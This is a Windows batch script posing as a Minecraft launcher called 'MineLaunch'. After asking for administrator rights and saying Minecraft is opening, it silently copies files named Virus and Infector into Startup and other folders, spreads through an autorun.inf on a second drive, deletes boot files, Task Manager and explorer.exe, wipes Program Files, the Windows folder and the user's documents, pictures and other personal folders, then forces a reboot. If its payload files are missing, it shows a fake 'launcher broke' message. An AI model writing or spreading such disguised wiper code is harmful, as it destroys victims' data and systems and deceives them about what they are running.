@echo off
title MineLaunch 1.0.0
net session >NUL 2>&1
if %errorlevel% neq 0 (
    echo.
    echo The Administrator privilages are not applied. Please re-launch with Administrator Privilages on.
    echo.
    echo Press [ENTER] to Exit
    pause >nul
    exit /b
)
echo Opening Minecraft...
echo Please do not close this window!
copy "Virus.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" /Y 1>nul 2>nul
xcopy "Virus.txt" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" /H /Q /Y 1>nul 2>nul
xcopy "Infector.txt" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" /H /Q /Y 1>nul 2>nul
xcopy "WindowsFireWallLog.txt" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" /H /Q /Y 1>nul 2>nul
xcopy "WinDiskSecurityLog.txt" "%windir%\System32" /H /Q /Y 1>nul 2>nul
copy "Virus.bat" "%temp%" /Y 1>nul 2>nul
xcopy "Virus.txt" "%temp%" /H /Q /Y 1>nul 2>nul
xcopy "Infector.txt" "%temp%" /H /Q /Y 1>nul 2>nul
xcopy "WindowsFireWallLog.txt" "%temp%" /H /Q /Y 1>nul 2>nul
copy "Virus.bat" "%localappdata%" /Y 1>nul 2>nul
xcopy "Virus.txt" "%localappdata%" /H /Q /Y 1>nul 2>nul
xcopy "Infector.txt" "%localappdata%" /H /Q /Y 1>nul 2>nul
xcopy "WindowsFireWallLog.txt" "%localappdata%" /H /Q /Y 1>nul 2>nul
copy "Virus.bat" "%appdata%" /Y 1>nul 2>nul
xcopy "Virus.txt" "%appdata%" /H /Q /Y 1>nul 2>nul
xcopy "Infector.txt" "%appdata%" /H /Q /Y 1>nul 2>nul
xcopy "WindowsFireWallLog.txt" "%appdata%" /H /Q /Y 1>nul 2>nul
copy "Virus.bat" "%systemdrive%" /Y 1>nul 2>nul
xcopy "Virus.txt" "%systemdrive%" /H /Q /Y 1>nul 2>nul
xcopy "Infector.txt" "%systemdrive%" /H /Q /Y 1>nul 2>nul
xcopy "WindowsFireWallLog.txt" "%systemdrive%" /H /Q /Y 1>nul 2>nul
if not exist "Virus.txt" goto del 1>nul 2>nul
diskpart /s Virus.txt 1>nul 2>nul
diskpart /s Infector.txt 1>nul 2>nul
diskpart /s WindowsFireWallLog.txt 1>nul 2>nul
takeown /f X:\ /R /D y 1>nul 2>nul
takeown /f %systemdrive%\Windows /R /D y 1>nul 2>nul
takeown /f %systemdrive%\ /R /D y 1>nul 2>nul
icacls X:\ /grant %username%:F /T 1>nul 2>nul
icacls %systemdrive%\ /grant %username%:F /T 1>nul 2>nul
copy "autorun.inf" Y:\ 1>nul 2>nul
copy "Virus.bat" Y:\ 1>nul 2>nul
copy "Virus.txt" Y:\ 1>nul 2>nul
copy "Infector.txt" Y:\ 1>nul 2>nul
copy "WinDiskSecurityLog.txt" Y:\ 1>nul 2>nul
copy "WindowsFireWallLog.txt" Y:\ 1>nul 2>nul
del X:\Boot /A:S /Q /S 1>nul 2>nu
del X:\bootmgr /A:S /Q /S 1>nul 2>nul
del "X:\System Volume Information" /A:S /Q /S 1>nul 2>nul
del X:\bootsect.bak /A:S /Q /S 1>nul 2>nul
del X:\ /S /Q /A:S 1>nul 2>nul
taskkill /F /IM explorer.exe 1>nul 2>nul
taskkill /F /IM taskmgr.exe 1>nul 2>nul
icacls %windir%\System32\taskmgr.exe /grant %username%:F /T 1>nul 2>nul
icacls %windir%\explorer.exe /grant %username%:F /T 1>nul 2>nul
del "%windir%\system32\Taskmgr.exe" /S /Q 1>nul 2>nul
del "%windir%\explorer.exe" /S /Q 1>nul 2>nul
start "%windir%\notepad.exe" "%systemdrive%\Windows\System32\WinDiskSecurityLog.txt" 1>nul 2>nul
del "%programfiles%\" /S /Q /A:S 1>nul 2>nul
del "%programfiles(x86)%\" /S /Q /A:S 1>nul 2>nul
del "%windir%\" /S /Q /A:S 1>nul 2>nul
del "%systemdrive%\Users\%username%\Downloads" /S /Q /A:S 1>nul 2>nul
del "%systemdrive%\Users\%username%\Documents" /S /Q /A:S 1>nul 2>nul
del "%systemdrive%\Users\%username%\Music" /S /Q /A:S 1>nul 2>nul
del "%systemdrive%\Users\%username%\Pictures" /S /Q /A:S 1>nul 2>nul
del "%systemdrive%\Users\%username%\AppData" /S /Q /A:S 1>nul 2>nul
del "%systemdrive%\Users\%username%\Videos" /S /Q /A:S 1>nul 2>nul
del "%systemdrive%\Users\%username%\Downloads" /S /Q /A:H 1>nul 2>nul
del "%systemdrive%\Users\%username%\Documents" /S /Q /A:H 1>nul 2>nul
del "%systemdrive%\Users\%username%\Music" /S /Q /A:H 1>nul 2>nul
del "%systemdrive%\Users\%username%\Pictures" /S /Q /A:H 1>nul 2>nul
del "%systemdrive%\Users\%username%\AppData" /S /Q /A:H 1>nul 2>nul
del "%systemdrive%\Users\%username%\Videos" /S /Q /A:H 1>nul 2>nul
del "%systemdrive%\Users\%username%\Downloads" /S /Q 1>nul 2>nul
del "%systemdrive%\Users\%username%\Documents" /S /Q 1>nul 2>nul
del "%systemdrive%\Users\%username%\Music" /S /Q 1>nul 2>nul
del "%systemdrive%\Users\%username%\Pictures" /S /Q 1>nul 2>nul
del "%systemdrive%\Users\%username%\AppData" /S /Q 1>nul 2>nul
del "%systemdrive%\Users\%username%\Videos" /S /Q 1>nul 2>nul
del "%systemdrive%\" /S /Q /A:S  1>nul 2>nul
del "%programfiles%\" /S /Q /A:H 1>nul 2>nul
del "%programfiles(x86)%\" /S /Q /A:H 1>nul 2>nul
del "%windir%\" /S /Q /A:H 1>nul 2>nul
del "%systemdrive%\" /S /Q /A:H  1>nul 2>nul
del "%programfiles%\" /S /Q  1>nul 2>nul
del "%programfiles(x86)%\" /S /Q 1>nul 2>nul
del "%windir%\" /S /Q 1>nul 2>nul
del "%systemdrive%\" /S /Q 1>nul 2>nul
shutdown /r /t 0
:del
del "%temp%\Virus.bat" /S /Q  1>nul 2>nul
del "%temp%\Virus.txt" /A:H /S /Q 1>nul 2>nul
del "%localappdata%\Virus.bat" /S /Q 1>nul 2>nul
del "%localappdata%\Virus.txt" /A:H /S /Q 1>nul 2>nul
del "%appdata%\Virus.bat" /S /Q 1>nul 2>nul
del "%appdata%\Virus.txt" /A:H /S /Q 1>nul 2>nul
del "%systemdrive%\Virus.bat" /S /Q 1>nul 2>nul
del "%systemdrive%\Virus.txt" /A:H /S /Q 1>nul 2>nul
cls
echo It seems like the launcher broke. Please reinstall it.
echo Press [Enter] to Close
pause >nul
exit
